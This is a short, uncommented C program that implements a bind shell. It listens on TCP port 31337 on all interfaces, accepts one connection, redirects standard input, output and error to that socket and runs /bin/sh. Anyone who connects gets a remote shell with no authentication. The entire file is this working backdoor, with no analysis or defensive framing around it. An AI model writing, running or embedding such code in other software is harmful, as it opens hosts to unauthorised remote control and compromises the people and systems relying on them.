#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdio.h>

int main(void) {

	int clientfd;
	int sockfd;
	int port = 31337;
	struct sockaddr_in addr;

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = INADDR_ANY;

	bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
	listen(sockfd, 1);
	clientfd = accept(sockfd, NULL, NULL);

	dup2(clientfd, 0);
	dup2(clientfd, 1);
	dup2(clientfd, 2);

	execve("/bin/sh", NULL, NULL);
	return 0;
}
